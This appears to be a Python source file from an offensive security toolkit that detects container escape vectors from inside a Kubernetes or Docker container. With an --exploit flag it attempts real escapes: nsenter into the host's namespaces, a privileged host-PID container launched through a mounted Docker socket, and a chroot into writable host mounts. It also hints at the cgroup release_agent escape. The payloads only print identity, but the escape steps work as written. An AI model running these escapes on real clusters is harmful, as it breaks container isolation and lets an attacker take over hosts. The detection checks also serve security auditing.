#!/usr/bin/env python3
"""
k8s_escape.py — Container Escape Detection and Exploitation

Detects container escape vectors from inside a running container: privileged mode,
hostPID, hostNetwork, Docker socket, writable hostPath, SYS_ADMIN capability,
and cgroup escape. Optionally exploits detected vectors with --exploit flag.

Runs FROM INSIDE a container — uses subprocess and filesystem checks.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime


class K8sEscaper:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.vectors_detected = 0
        self.vectors_exploitable = 0

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Container Escape Detection")
        print("=" * 70)
        print(f"PID:        {os.getpid()}")
        print(f"Exploit:    {'ENABLED' if self.args.exploit else 'detection only'}")
        print(f"Output:     {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:    {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if record.get("detected"):
            self.vectors_detected += 1
        if record.get("exploitable"):
            self.vectors_exploitable += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            status = "DETECTED" if record.get("detected") else "NOT FOUND"
            exploit_status = " [EXPLOITABLE]" if record.get("exploitable") else ""
            print(f"[{status}]{exploit_status} {record['vector_name']}", flush=True)
            print(f"  details: {record.get('details', 'N/A')}", flush=True)
            if record.get("exploit_output"):
                print(f"  exploit: {record['exploit_output']}", flush=True)

    def read_file(self, path):
        """Safely read a file and return its contents."""
        try:
            with open(path, "r") as f:
                return f.read()
        except (OSError, PermissionError):
            return None

    def run_cmd(self, cmd, timeout=10):
        """Run a command and return (returncode, stdout, stderr)."""
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
            return result.returncode, result.stdout, result.stderr
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            return -1, "", ""

    def check_privileged(self):
        """Check if container is running in privileged mode via CapEff."""
        if not self.running:
            return
        detected = False
        details = ""
        cap_eff = None

        status = self.read_file("/proc/1/status")
        if status:
            for line in status.splitlines():
                if line.startswith("CapEff:"):
                    cap_eff = line.split(":")[1].strip()
                    break

        if cap_eff and cap_eff.lower() in ("0000003fffffffff", "000001ffffffffff", "0000003fffffffffff"):
            detected = True
            details = f"All capabilities enabled (CapEff={cap_eff}) — container is privileged"
        elif cap_eff:
            details = f"Limited capabilities (CapEff={cap_eff})"
        else:
            details = "Could not read /proc/1/status CapEff"

        exploit_output = None
        if detected and self.args.exploit:
            rc, stdout, stderr = self.run_cmd("nsenter --target 1 --mount --uts --ipc --net --pid -- id")
            if rc == 0:
                exploit_output = f"nsenter to host succeeded: {stdout.strip()}"
            else:
                exploit_output = "nsenter failed — may need additional capabilities"

        self.emit({
            "timestamp": datetime.now().isoformat(),
            "vector_name": "privileged_mode",
            "detected": detected,
            "exploitable": detected,
            "details": details,
            "exploit_output": exploit_output,
        })

    def check_host_pid(self):
        """Check if hostPID is enabled by inspecting PID 1."""
        if not self.running:
            return
        detected = False
        details = ""

        comm = self.read_file("/proc/1/comm")
        if comm:
            comm = comm.strip()
            host_init_names = ["systemd", "init", "launchd", "sysvinit"]
            if comm in host_init_names:
                detected = True
                details = f"PID 1 is '{comm}' — hostPID is enabled, host processes visible"
            else:
                details = f"PID 1 is '{comm}' — appears to be container entrypoint"
        else:
            details = "Could not read /proc/1/comm"

        self.emit({
            "timestamp": datetime.now().isoformat(),
            "vector_name": "host_pid",
            "detected": detected,
            "exploitable": detected,
            "details": details,
            "exploit_output": None,
        })

    def check_host_network(self):
        """Check if hostNetwork is enabled by comparing network namespaces."""
        if not self.running:
            return
        detected = False
        details = ""

        try:
            self_ns = os.readlink("/proc/self/ns/net")
            pid1_ns = os.readlink("/proc/1/ns/net")
            if self_ns == pid1_ns:
                detected = True
                details = f"Network namespace matches PID 1 ({self_ns}) — hostNetwork enabled"
            else:
                details = f"Separate network namespace (self={self_ns}, pid1={pid1_ns})"
        except (OSError, PermissionError):
            details = "Could not compare network namespaces"

        self.emit({
            "timestamp": datetime.now().isoformat(),
            "vector_name": "host_network",
            "detected": detected,
            "exploitable": detected,
            "details": details,
            "exploit_output": None,
        })

    def check_docker_socket(self):
        """Check if Docker socket is mounted and writable."""
        if not self.running:
            return
        socket_path = "/var/run/docker.sock"
        detected = False
        exploitable = False
        details = ""
        exploit_output = None

        if os.path.exists(socket_path):
            detected = True
            if os.access(socket_path, os.W_OK):
                exploitable = True
                details = f"Docker socket found at {socket_path} — WRITABLE"
            else:
                details = f"Docker socket found at {socket_path} — read-only"
        else:
            details = "Docker socket not found at /var/run/docker.sock"

        if exploitable and self.args.exploit:
            rc, stdout, stderr = self.run_cmd(
                f"docker -H unix://{socket_path} run --rm --privileged --pid=host alpine id"
            )
            if rc == 0:
                exploit_output = f"Docker socket escape succeeded: {stdout.strip()}"
            else:
                exploit_output = f"Docker socket escape failed: {stderr.strip()}"

        self.emit({
            "timestamp": datetime.now().isoformat(),
            "vector_name": "docker_socket",
            "detected": detected,
            "exploitable": exploitable,
            "details": details,
            "exploit_output": exploit_output,
        })

    def check_hostpath(self):
        """Check for writable host filesystem mounts."""
        if not self.running:
            return
        detected = False
        exploitable = False
        details = ""
        exploit_output = None
        writable_paths = []

        common_mounts = ["/host", "/rootfs", "/host-root", "/etc/kubernetes",
                         "/var/log/host", "/hostproc", "/hostsys"]

        for mount_path in common_mounts:
            if os.path.exists(mount_path) and os.path.isdir(mount_path):
                detected = True
                if os.access(mount_path, os.W_OK):
                    exploitable = True
                    writable_paths.append(mount_path)

        if writable_paths:
            details = f"Writable hostPath mounts found: {', '.join(writable_paths)}"
        elif detected:
            details = "Host filesystem mounts found but read-only"
        else:
            details = "No common hostPath mounts detected"

        if exploitable and self.args.exploit and writable_paths:
            target = writable_paths[0]
            rc, stdout, stderr = self.run_cmd(f"chroot {target} /bin/sh -c 'id && hostname'")
            if rc == 0:
                exploit_output = f"chroot to {target} succeeded: {stdout.strip()}"
            else:
                exploit_output = f"chroot to {target} failed: {stderr.strip()}"

        self.emit({
            "timestamp": datetime.now().isoformat(),
            "vector_name": "writable_hostpath",
            "detected": detected,
            "exploitable": exploitable,
            "details": details,
            "exploit_output": exploit_output,
        })

    def check_sys_admin(self):
        """Check if SYS_ADMIN capability is available."""
        if not self.running:
            return
        detected = False
        details = ""

        status = self.read_file("/proc/1/status")
        if status:
            for line in status.splitlines():
                if line.startswith("CapEff:"):
                    cap_hex = line.split(":")[1].strip()
                    try:
                        cap_int = int(cap_hex, 16)
                        sys_admin_bit = 1 << 21
                        if cap_int & sys_admin_bit:
                            detected = True
                            details = f"SYS_ADMIN capability is set (CapEff={cap_hex})"
                        else:
                            details = f"SYS_ADMIN capability is NOT set (CapEff={cap_hex})"
                    except ValueError:
                        details = f"Could not parse CapEff: {cap_hex}"
                    break
        else:
            details = "Could not read /proc/1/status"

        self.emit({
            "timestamp": datetime.now().isoformat(),
            "vector_name": "sys_admin_cap",
            "detected": detected,
            "exploitable": detected,
            "details": details,
            "exploit_output": None,
        })

    def check_cgroup_escape(self):
        """Check for cgroup-based container escape (CVE-2022-0492 and similar)."""
        if not self.running:
            return
        detected = False
        exploitable = False
        details = ""
        exploit_output = None

        cgroup = self.read_file("/proc/1/cgroup")
        if cgroup:
            if "docker" in cgroup or "kubepods" in cgroup or "containerd" in cgroup:
                detected = True
                details = "Container cgroup detected — cgroup escape may be possible"
            else:
                details = "No container cgroup markers found"

            if detected:
                rdma_path = "/sys/fs/cgroup/rdma"
                if os.path.exists(rdma_path):
                    release_agent = os.path.join(rdma_path, "release_agent")
                    notify = os.path.join(rdma_path, "notify_on_release")
                    if os.access(rdma_path, os.W_OK):
                        exploitable = True
                        details += " — cgroup directory is writable"
                    else:
                        details += " — cgroup directory is read-only"
        else:
            details = "Could not read /proc/1/cgroup"

        if exploitable and self.args.exploit:
            exploit_output = ("cgroup release_agent escape requires manual setup — "
                              "write payload to release_agent and trigger via cgroup removal")

        self.emit({
            "timestamp": datetime.now().isoformat(),
            "vector_name": "cgroup_escape",
            "detected": detected,
            "exploitable": exploitable,
            "details": details,
            "exploit_output": exploit_output,
        })

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        self.check_privileged()
        self.check_host_pid()
        self.check_host_network()
        self.check_docker_socket()
        self.check_hostpath()
        self.check_sys_admin()
        self.check_cgroup_escape()

        self.cleanup()

    def cleanup(self):
        print(f"\n--- k8s_escape summary ---")
        print(f"Vectors checked: {self.event_count}")
        print(f"Vectors detected: {self.vectors_detected}")
        print(f"Vectors exploitable: {self.vectors_exploitable}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Detect and exploit container escape vectors from inside a container.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 k8s_escape.py\n"
            "  python3 k8s_escape.py --exploit\n"
            "  python3 k8s_escape.py --json-output\n"
        ),
    )
    parser.add_argument("--exploit", action="store_true", default=False,
                        help="Attempt exploitation of detected vectors")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    escaper = K8sEscaper(args)
    escaper.run()


if __name__ == "__main__":
    main()
